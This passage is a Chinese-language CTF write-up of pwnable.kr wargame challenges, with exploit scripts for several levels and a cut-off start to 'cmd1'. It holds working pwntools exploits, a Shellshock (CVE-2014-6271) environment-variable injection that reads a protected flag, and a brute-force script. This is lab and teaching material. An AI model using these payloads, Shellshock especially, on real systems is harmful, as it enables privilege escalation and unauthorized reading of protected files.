<p>&#x9996;&#x5148;&#x9898;&#x76EE;&#x76EE;&#x5F55;&#x662F;&#x4E0D;&#x53EF;&#x5199;&#x7684;</p>
<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8981;&#x628A;&#x7A0B;&#x5E8F;&#x653E;&#x5728;&#x5176;&#x4ED6;&#x5730;&#x65B9;</p>
<p>&#x770B;&#x53EF;&#x5199;&#x76EE;&#x5F55;&#xB7;</p>
<pre><code>ls -al /
drwxrwx-wt 5677 root root 159744 Dec  5 09:36 tmp
</code></pre><p>&#x4FEE;&#x6539;&#x8FDC;&#x7A0B;&#x811A;&#x672C;</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/socket.h&gt;</span>//socket</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;netdb.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">101</span>]={<span class="hljs-string">&quot;/home/input2/input&quot;</span>,
                     [<span class="hljs-number">1</span> ... <span class="hljs-number">99</span>]=<span class="hljs-string">&quot;A&quot;</span>,
                     <span class="hljs-literal">NULL</span>},
         *envp[<span class="hljs-number">2</span>]={<span class="hljs-string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>,
                  <span class="hljs-literal">NULL</span>};

    argv[<span class="hljs-string">&apos;A&apos;</span>]=<span class="hljs-string">&quot;\x00&quot;</span>;
    argv[<span class="hljs-string">&apos;B&apos;</span>]=<span class="hljs-string">&quot;\x20\x0a\x0d&quot;</span>;
    argv[<span class="hljs-string">&apos;C&apos;</span>]=<span class="hljs-string">&quot;55566&quot;</span>;

    <span class="hljs-keyword">int</span> pipe_stdin[<span class="hljs-number">2</span>] = {<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>};
    <span class="hljs-keyword">int</span> pipe_stderr[<span class="hljs-number">2</span>] = {<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>};
    <span class="hljs-keyword">pid_t</span> pid_child;

    <span class="hljs-keyword">if</span>(pipe(pipe_stdin)&lt;<span class="hljs-number">0</span> || pipe(pipe_stderr)&lt;<span class="hljs-number">0</span>){
        perror(<span class="hljs-string">&quot;pipe creation failed&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }


    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN_READ   pipe_stdin[0]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDIN_WRITE  pipe_stdin[1]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDERR_READ  pipe_stderr[0]</span>
    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STDERR_WRITE pipe_stderr[1]</span>

    <span class="hljs-keyword">if</span>( ( pid_child =fork() ) &lt; <span class="hljs-number">0</span> ){
        perror(<span class="hljs-string">&quot;Cannot create fork child.&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">if</span>(pid_child == <span class="hljs-number">0</span>){<span class="hljs-comment">//child</span>
        <span class="hljs-comment">//sleep(1);//wait for pipe func</span>
        close(STDIN_READ);
        close(STDERR_READ);
        write(STDIN_WRITE,<span class="hljs-string">&quot;\x00\x0a\x00\xff&quot;</span>,<span class="hljs-number">4</span>);
        write(STDERR_WRITE,<span class="hljs-string">&quot;\x00\x0a\x02\xff&quot;</span>,<span class="hljs-number">4</span>);
    }<span class="hljs-keyword">else</span> {<span class="hljs-comment">//parent</span>
        close(STDIN_WRITE);
        close(STDERR_WRITE);
        dup2(STDIN_READ,<span class="hljs-number">0</span>);
        dup2(STDERR_READ,<span class="hljs-number">2</span>);
        execve(<span class="hljs-string">&quot;/home/input2/input&quot;</span>,argv,envp);<span class="hljs-comment">//&#x7EDD;&#x5BF9;&#x5730;&#x5740;</span>
    }
    <span class="hljs-comment">//printf(&quot;pipe linked.\n&quot;);</span>

    FILE *fp= fopen(<span class="hljs-string">&quot;\x0a&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>);
    <span class="hljs-keyword">if</span>(!fp) perror(<span class="hljs-string">&quot;Can not open file.&quot;</span>);
    <span class="hljs-comment">//puts(&quot;Open file success.&quot;);</span>
    fwrite(<span class="hljs-string">&quot;\x00\x00\x00\x00&quot;</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fp);
    fclose(fp);

    sleep(<span class="hljs-number">2</span>);
    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">10</span>]={<span class="hljs-number">0</span>};
    <span class="hljs-keyword">struct</span> sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(atoi(argv[<span class="hljs-string">&apos;C&apos;</span>]));
    servaddr.sin_addr.s_addr= inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);

    <span class="hljs-keyword">int</span> sockfd=socket(PF_INET,SOCK_STREAM,<span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span>(sockfd&lt;<span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">&quot;\xde\xad\xbe\xef&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    <span class="hljs-keyword">if</span>(connect(sockfd,(<span class="hljs-keyword">struct</span> sockaddr *) &amp;servaddr,<span class="hljs-keyword">sizeof</span>(servaddr))&lt;<span class="hljs-number">0</span>){
        perror(<span class="hljs-string">&quot;connect error.&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket connect.\n&quot;</span>);
    <span class="hljs-built_in">strcpy</span>(buf,<span class="hljs-string">&quot;\xde\xad\xbe\xef&quot;</span>);
    send(sockfd,buf,<span class="hljs-built_in">strlen</span>(buf),<span class="hljs-number">0</span>);
    close(sockfd);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x5751;&#x70B9;&#x662F;&#x7A0B;&#x5E8F;&#x62FF;flag&#x662F;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x7684;</p>
<p>&#x800C;&#x5F53;&#x524D;&#x76EE;&#x5F55;/tmp&#x4E0B;&#x5E76;&#x6CA1;&#x6709;</p>
<p>&#x6240;&#x4EE5;&#x8FD8;&#x8981;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x8F6F;&#x8FDE;&#x63A5;</p>
<pre><code>ln /home/input/flag flag
</code></pre><p>&#x653E;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x8DD1;&#x4E00;&#x8DD1;&#x5C31;&#x51FA;flag&#x4E86;</p>
<h2 id="0x08-leg"><a name="0x08-leg" class="anchor-navigation-ex-anchor" href="#0x08-leg"><i class="fa fa-link" aria-hidden="true"></i></a>0x08 leg</h2>
<p>&#x901A;&#x8FC7;&#x5206;&#x6790;arm&#x5E73;&#x53F0;&#x6C47;&#x7F16;&#x4EE3;&#x7801;&#x8BA1;&#x7B97;&#x4E09;&#x4E2A;key&#x503C;</p>
<p>key1</p>
<pre><code class="lang-assembly">(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 &lt;+0&gt;:    push    {r11}        ; (str r11, [sp, #-4]!)
   0x00008cd8 &lt;+4&gt;:    add    r11, sp, #0
   0x00008cdc &lt;+8&gt;:    mov    r3, pc
   0x00008ce0 &lt;+12&gt;:    mov    r0, r3
   0x00008ce4 &lt;+16&gt;:    sub    sp, r11, #0
   0x00008ce8 &lt;+20&gt;:    pop    {r11}        ; (ldr r11, [sp], #4)
   0x00008cec &lt;+24&gt;:    bx    lr
End of assembler dump.
</code></pre>
<p>r3&#x4E3A;&#x7A0B;&#x5E8F;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;pc=0x00008cdc+8</p>
<pre><code>&#x5BF9;&#x4E8E;ARM&#x6307;&#x4EE4;&#x96C6;&#x800C;&#x8A00;&#xFF0C;PC&#x603B;&#x662F;&#x6307;&#x5411;&#x5F53;&#x524D;&#x6307;&#x4EE4;&#x7684;&#x4E0B;&#x4E24;&#x6761;&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740;(ARM&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#x91C7;&#x7528;&#x7684;&#x591A;&#x7EA7;&#x6D41;&#x6C34;&#x7EBF;&#x6280;&#x672F;),&#x5373;PC&#x7684;&#x503C;&#x4E3A;&#x5F53;&#x524D;&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740;&#x503C;&#x52A0;8&#x4E2A;&#x5B57;&#x8282;&#x7A0B;&#x5E8F;&#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668;&#x3002;
</code></pre><p>&#x6240;&#x4EE5;</p>
<pre><code>key1=0x00008cdc+0x08
</code></pre><pre><code class="lang-assembly">(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 &lt;+0&gt;:    push    {r11}        ; (str r11, [sp, #-4]!)
   0x00008cf4 &lt;+4&gt;:    add    r11, sp, #0
   0x00008cf8 &lt;+8&gt;:    push    {r6}        ; (str r6, [sp, #-4]!)
   0x00008cfc &lt;+12&gt;:    add    r6, pc, #1
   0x00008d00 &lt;+16&gt;:    bx    r6           ;r6&#x6700;&#x540E;&#x4E00;&#x4F4D;&#x662F;1 &#x8FDB;&#x5165;ARM thumb&#x6A21;&#x5F0F; pc=&#x5F53;&#x524D;&#x5730;&#x5740;+4
   0x00008d04 &lt;+20&gt;:    mov    r3, pc
   0x00008d06 &lt;+22&gt;:    adds    r3, #4
   0x00008d08 &lt;+24&gt;:    push    {r3}
   0x00008d0a &lt;+26&gt;:    pop    {pc}
   0x00008d0c &lt;+28&gt;:    pop    {r6}        ; (ldr r6, [sp], #4)
   0x00008d10 &lt;+32&gt;:    mov    r0, r3
   0x00008d14 &lt;+36&gt;:    sub    sp, r11, #0
   0x00008d18 &lt;+40&gt;:    pop    {r11}        ; (ldr r11, [sp], #4)
   0x00008d1c &lt;+44&gt;:    bx    lr
End of assembler dump.
</code></pre>
<p>&#x6240;&#x4EE5;&#x6709;</p>
<pre><code>key2=0x00008d04+0x04+0x04
</code></pre><p>key3</p>
<pre><code class="lang-assembly">(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 &lt;+0&gt;:    push    {r11}        ; (str r11, [sp, #-4]!)
   0x00008d24 &lt;+4&gt;:    add    r11, sp, #0
   0x00008d28 &lt;+8&gt;:    mov    r3, lr
   0x00008d2c &lt;+12&gt;:    mov    r0, r3
   0x00008d30 &lt;+16&gt;:    sub    sp, r11, #0
   0x00008d34 &lt;+20&gt;:    pop    {r11}        ; (ldr r11, [sp], #4)
   0x00008d38 &lt;+24&gt;:    bx    lr
End of assembler dump.
</code></pre>
<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;r3=lr</p>
<p>lr&#x662F;key3&#x7684;&#x7A0B;&#x5E8F;&#x8FD4;&#x56DE;&#x5730;&#x5740;</p>
<p>&#x5728;main&#x91CC;&#x627E;&#x4E00;&#x4E0B;</p>
<pre><code class="lang-assembly">(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c &lt;+0&gt;:    push    {r4, r11, lr}
   0x00008d40 &lt;+4&gt;:    add    r11, sp, #8
   0x00008d44 &lt;+8&gt;:    sub    sp, sp, #12
   0x00008d48 &lt;+12&gt;:    mov    r3, #0
   0x00008d4c &lt;+16&gt;:    str    r3, [r11, #-16]
   0x00008d50 &lt;+20&gt;:    ldr    r0, [pc, #104]    ; 0x8dc0 &lt;main+132&gt;
   0x00008d54 &lt;+24&gt;:    bl    0xfb6c &lt;printf&gt;
   0x00008d58 &lt;+28&gt;:    sub    r3, r11, #16
   0x00008d5c &lt;+32&gt;:    ldr    r0, [pc, #96]    ; 0x8dc4 &lt;main+136&gt;
   0x00008d60 &lt;+36&gt;:    mov    r1, r3
   0x00008d64 &lt;+40&gt;:    bl    0xfbd8 &lt;__isoc99_scanf&gt;
   0x00008d68 &lt;+44&gt;:    bl    0x8cd4 &lt;key1&gt;
   0x00008d6c &lt;+48&gt;:    mov    r4, r0
   0x00008d70 &lt;+52&gt;:    bl    0x8cf0 &lt;key2&gt;
   0x00008d74 &lt;+56&gt;:    mov    r3, r0
   0x00008d78 &lt;+60&gt;:    add    r4, r4, r3
   0x00008d7c &lt;+64&gt;:    bl    0x8d20 &lt;key3&gt;
   0x00008d80 &lt;+68&gt;:    mov    r3, r0          ;&#x5728;&#x8FD9;
   0x00008d84 &lt;+72&gt;:    add    r2, r4, r3
   0x00008d88 &lt;+76&gt;:    ldr    r3, [r11, #-16]
   0x00008d8c &lt;+80&gt;:    cmp    r2, r3
   0x00008d90 &lt;+84&gt;:    bne    0x8da8 &lt;main+108&gt;
   0x00008d94 &lt;+88&gt;:    ldr    r0, [pc, #44]    ; 0x8dc8 &lt;main+140&gt;
   0x00008d98 &lt;+92&gt;:    bl    0x1050c &lt;puts&gt;
   0x00008d9c &lt;+96&gt;:    ldr    r0, [pc, #40]    ; 0x8dcc &lt;main+144&gt;
   0x00008da0 &lt;+100&gt;:    bl    0xf89c &lt;system&gt;
   0x00008da4 &lt;+104&gt;:    b    0x8db0 &lt;main+116&gt;
   0x00008da8 &lt;+108&gt;:    ldr    r0, [pc, #32]    ; 0x8dd0 &lt;main+148&gt;
   0x00008dac &lt;+112&gt;:    bl    0x1050c &lt;puts&gt;
   0x00008db0 &lt;+116&gt;:    mov    r3, #0
   0x00008db4 &lt;+120&gt;:    mov    r0, r3
   0x00008db8 &lt;+124&gt;:    sub    sp, r11, #8
   0x00008dbc &lt;+128&gt;:    pop    {r4, r11, pc}
   0x00008dc0 &lt;+132&gt;:    andeq    r10, r6, r12, lsl #9
   0x00008dc4 &lt;+136&gt;:    andeq    r10, r6, r12, lsr #9
   0x00008dc8 &lt;+140&gt;:            ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0
   0x00008dcc &lt;+144&gt;:            ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc
   0x00008dd0 &lt;+148&gt;:    andeq    r10, r6, r4, asr #9
End of assembler dump.
</code></pre>
<p>&#x6240;&#x4EE5;</p>
<pre><code>key3=0x00008d80
</code></pre><h3 id="exp_2"><a name="exp_2" class="anchor-navigation-ex-anchor" href="#exp_2"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

shell=ssh(host=<span class="hljs-string">&apos;pwnable.kr&apos;</span>,user=<span class="hljs-string">&apos;leg&apos;</span>,password=<span class="hljs-string">&apos;guest&apos;</span>,port=<span class="hljs-number">2222</span>)

key1=<span class="hljs-number">0x00008cdc</span>+<span class="hljs-number">0x08</span>
key2=<span class="hljs-number">0x00008d04</span>+<span class="hljs-number">0x04</span>+<span class="hljs-number">0x04</span>
key3=<span class="hljs-number">0x00008d80</span>

print(str(key1+key2+key3))
leg=shell.run(<span class="hljs-string">&quot;sh&quot;</span>)
leg.sendline(str(key1+key2+key3))
leg.interactive()
</code></pre>
<h3 id="&#x53C2;&#x8003;&#x8D44;&#x6599;"><a name="&#x53C2;&#x8003;&#x8D44;&#x6599;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x8D44;&#x6599;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h3>
<p><a href="http://blog.chinaunix.net/uid-28458801-id-3792828.html" target="_blank">http://blog.chinaunix.net/uid-28458801-id-3792828.html</a></p>
<p><a href="https://www.cnblogs.com/wrjvszq/p/4199682.html" target="_blank">https://www.cnblogs.com/wrjvszq/p/4199682.html</a></p>
<h2 id="0x09-misktake"><a name="0x09-misktake" class="anchor-navigation-ex-anchor" href="#0x09-misktake"><i class="fa fa-link" aria-hidden="true"></i></a>0x09 misktake</h2>
<p>&#x770B;&#x4E86;&#x5F88;&#x4E45;&#x624D;&#x53CD;&#x5E94;&#x8FC7;&#x6765;&#x662F;&#x8FD0;&#x7B97;&#x7B26;&#x4F18;&#x5148;&#x7EA7;&#x7684;&#x95EE;&#x9898;</p>
<pre><code class="lang-c">    <span class="hljs-keyword">if</span>(fd=open(<span class="hljs-string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="hljs-number">0400</span>) &lt; <span class="hljs-number">0</span>){<span class="hljs-comment">//&#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x7B26;&#x4F18;&#x5148;&#x7EA7;&#x9AD8;&#x4E8E;&#x8D4B;&#x503C;&#x8FD0;&#x7B97;&#x7B26; fd&#x59CB;&#x7EC8;&#x4E3A;0 &#x4E5F;&#x5373;stdin</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can&apos;t open password %d\n&quot;</span>, fd);
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
</code></pre>
<p>&#x7136;&#x540E;&#x81EA;&#x5DF1;&#x6784;&#x9020;&#x4E00;&#x7EC4;&#x5BC6;&#x7801;&#x5C31;&#x884C;</p>
<p>&#x6BD4;&#x5982; 0000000000 -xor()-&gt; 1111111111</p>
<h3 id="exp_3"><a name="exp_3" class="anchor-navigation-ex-anchor" href="#exp_3"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *


shell=ssh(host=<span class="hljs-string">&apos;pwnable.kr&apos;</span>,user=<span class="hljs-string">&apos;mistake&apos;</span>,password=<span class="hljs-string">&apos;guest&apos;</span>,port=<span class="hljs-number">2222</span>)
<span class="hljs-comment">#shell.download_file(&quot;./mistake.c&quot;)</span>
<span class="hljs-comment">#shell.download_file(&quot;./mistake&quot;)</span>


io=shell.run(<span class="hljs-string">&apos;./mistake&apos;</span>)
payload=<span class="hljs-string">&quot;0000000000&quot;</span>
io.sendafter(<span class="hljs-string">&quot;do not bruteforce...\n&quot;</span>,payload)
payload=<span class="hljs-string">&quot;1111111111&quot;</span>
io.sendafter(<span class="hljs-string">&quot;input password : &quot;</span>,payload)
io.interactive()
</code></pre>
<h2 id="0x0a--shellsock"><a name="0x0a--shellsock" class="anchor-navigation-ex-anchor" href="#0x0a--shellsock"><i class="fa fa-link" aria-hidden="true"></i></a>0x0A  shellsock</h2>
<p>CVE-2014-6271 Shellsock</p>
<p>&#x5229;&#x7528;&#x65B9;&#x5F0F;&#xFF1A;</p>
<pre><code class="lang-bash">env x=<span class="hljs-string">&apos;() { :;}; echo vulnerable&apos;</span>  bash -c <span class="hljs-string">&quot;echo this is a test&quot;</span>
</code></pre>
<p>&#x539F;&#x7406;&#x5206;&#x6790;&#xFF1A;<a href="https://blog.csdn.net/tinyletero/article/details/40261593" target="_blank">https://blog.csdn.net/tinyletero/article/details/40261593</a></p>
<p>&#x9898;&#x76EE;&#x6E90;&#x7801;</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    system(<span class="hljs-string">&quot;/home/shellshock/bash -c &apos;echo shock_me&apos;&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x6743;&#x9650;(ls -l)</p>
<pre><code>-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
</code></pre><p>&#x6CE8;&#x610F;&#x5230; flag&#x662F;shellshock_pwn&#x53EF;&#x8BFB;&#x7684;</p>
<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;./shellsock&#x7A0B;&#x5E8F;&#x83B7;&#x5F97;&#x8BFB;&#x6743;&#x9650;&#xFF0C;&#x52A0;&#x4E0A;&#x4E4B;&#x524D;&#x5229;&#x7528;shellsock&#x62FC;&#x63A5;&#x7684;&#x201C;cat flag&#x201D;&#x5C31;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;flag&#x4E86;</p>
<p>Exp:</p>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *


shell=ssh(host=<span class="hljs-string">&apos;pwnable.kr&apos;</span>,user=<span class="hljs-string">&apos;shellshock&apos;</span>,password=<span class="hljs-string">&apos;guest&apos;</span>,port=<span class="hljs-number">2222</span>)

<span class="hljs-comment">#shell.download_file(&quot;./shellshock.c&quot;)</span>
<span class="hljs-comment">#shell.download_file(&quot;./shellshock&quot;)</span>

sh=shell.run(<span class="hljs-string">&apos;sh&apos;</span>)
sh.sendline(<span class="hljs-string">&quot;env x=&apos;() { :;}; bash -c \&quot;cat flag\&quot; &apos; ./shellshock&quot;</span>)
sh.interactive()
</code></pre>
<h2 id="0x0b-coin"><a name="0x0b-coin" class="anchor-navigation-ex-anchor" href="#0x0b-coin"><i class="fa fa-link" aria-hidden="true"></i></a>0x0B coin</h2>
<p>&#x79F0;&#x786C;&#x5E01;&#x627E;&#x4E0D;&#x540C;</p>
<p>&#x76F4;&#x63A5;&#x4E8C;&#x5206;&#x5C31;&#x53EF;</p>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> re <span class="hljs-comment">#&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x53D6;&#x6570;</span>

io=remote(<span class="hljs-string">&quot;pwnable.kr&quot;</span>,<span class="hljs-string">&quot;9007&quot;</span>)
io.recv()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GetWeight</span><span class="hljs-params">(l,r)</span>:</span>
    sendstr = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">if</span> l==r:
        io.sendline(str(l))
    <span class="hljs-keyword">else</span> :
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(l,r+<span class="hljs-number">1</span>):
            sendstr = sendstr + str(i)+<span class="hljs-string">&quot; &quot;</span>
        io.sendline(sendstr)
    ret = io.recvline()
    <span class="hljs-keyword">return</span> int(ret)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span><span class="hljs-params">(num,chance)</span>:</span>
    l=<span class="hljs-number">0</span>
    r=num<span class="hljs-number">-1</span>
    weight=<span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,chance):
        weight=GetWeight(l,int(l+(r-l)/<span class="hljs-number">2</span>))
        <span class="hljs-keyword">if</span> weight%<span class="hljs-number">10</span>!=<span class="hljs-number">0</span>:
            r = int(l+(r-l)/<span class="hljs-number">2</span>)
        <span class="hljs-keyword">else</span>:
            l = int(l+(r-l)/<span class="hljs-number">2</span>)+<span class="hljs-number">1</span>
    io.sendline(str(r))
    <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;[+]server:&apos;</span>,io.recvline()



<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):
    quest = io.recvline()
    q = re.compile(<span class="hljs-string">r&apos;\d+&apos;</span>)<span class="hljs-comment">#&#x53D6;&#x6570;&#x5B57;</span>
    data = q.findall(quest)
    N = int(data[<span class="hljs-number">0</span>])
    C = int(data[<span class="hljs-number">1</span>])
    <span class="hljs-comment">#print N,C</span>
    solve(N,C)
io.interactive()
</code></pre>
<p>&#x672C;&#x5730;&#x8DD1;&#x4E86;20&#x4E2A;&#x5C31;60s&#x4E86;&#xFF0C;&#x653E;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x8DD1;&#x624D;&#x8FC7;&#x3002;&#x3002;&#x3002;&#xFF08;&#x5229;&#x7528;input&#x90A3;&#x9053;&#x9898;&#x7684;&#x8D26;&#x6237;&#x3002;&#x3002;&#x3002;&#x3002;&#x3002;&#xFF09;</p>
<h2 id="0x0c-blackjack"><a name="0x0c-blackjack" class="anchor-navigation-ex-anchor" href="#0x0c-blackjack"><i class="fa fa-link" aria-hidden="true"></i></a>0x0C blackjack</h2>
<p>&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x6F0F;&#x6D1E;</p>
<p>&#x4E0B;&#x8D1F;&#x6570;&#x8D4C;&#x6CE8;&#xFF0C;&#x8F93;&#x4E86;&#x5C31;&#x62FF;&#x5230;&#x6B63;&#x6570;&#x7684;&#x94B1;&#x4E86;&#x3002;&#x3002;&#x3002;&#x3002;&#x3002;&#x3002;&#x3002;</p>
<h2 id="0x0d-lotto"><a name="0x0d-lotto" class="anchor-navigation-ex-anchor" href="#0x0d-lotto"><i class="fa fa-link" aria-hidden="true"></i></a>0x0D lotto</h2>
<p>&#x6E90;&#x7801;&#x4E2D;&#x6BD4;&#x8F83;&#x8FC7;&#x7A0B;&#x5B58;&#x5728;&#x95EE;&#x9898;</p>
<pre><code class="lang-c">    <span class="hljs-keyword">int</span> match = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++){
        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">6</span>; j++){
            <span class="hljs-keyword">if</span>(lotto[i] == submit[j]){ <span class="hljs-comment">//&#x4E8B;&#x5B9E;&#x4E0A;&#x53EA;&#x8981;submit[j]&#x540C;&#x65F6;&#x62BC;&#x4E2D;&#x4E00;&#x4E2A;lotto[i]&#x5C31;&#x80FD;&#x5237;&#x6EE1;&#x5206;</span>
                match++;
            }
        }
    }
</code></pre>
<p>&#x5927;&#x5927;&#x964D;&#x4F4E;&#x4E86;&#x7206;&#x7834;&#x96BE;&#x5EA6;&#xFF0C;&#x8DD1;&#x4E2A;&#x811A;&#x672C;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</p>
<p><strong>Exp</strong></p>
<pre><code>#coding=utf-8
from pwn import *

shell=ssh(&quot;lotto&quot;,&quot;pwnable.kr&quot;,2222,&quot;guest&quot;)

#shell.download_file(&quot;./lotto.c&quot;)
sh=shell.run(&quot;./lotto&quot;)
sh.recv()

payload=chr(1)+chr(1)+chr(1)+chr(1)+chr(1)+chr(1)

while 1:
    sh.sendline(&quot;1&quot;)
    print sh.recv()
    sh.sendline(payload)
    text=sh.recv()
    print len(text)
    if len(text)&gt;71:
        print text
        break
</code></pre><h2 id="0x0e-cmd1"><a name="0x0e-cmd1" class="anchor-navigation-ex-anchor" href="#0x0e-cmd1"><i class="fa fa-link" aria-hidden="true"></i></a>0x0E cmd1</h2>
<pre><code class="lang-cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">filter</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* cmd)</span></span>{
    <span class="hljs-keyword">int</span> r=<span class="hljs-number">0</span>;
    r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;flag&quot;</span>)!=<span class="hljs-number">0</span>;
    r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;sh&quot;</span>)!=<span class="hljs-number">0</span>;
    r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;tmp&quot;</span>)!=<span class="hljs-number">0</span>;
    <span class="hljs-keyword">return</span> r;
}
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>** envp)</span></span>{
    putenv(<span class="hljs-string">&quot;PATH=/thankyouverymuch&quot;</span>);
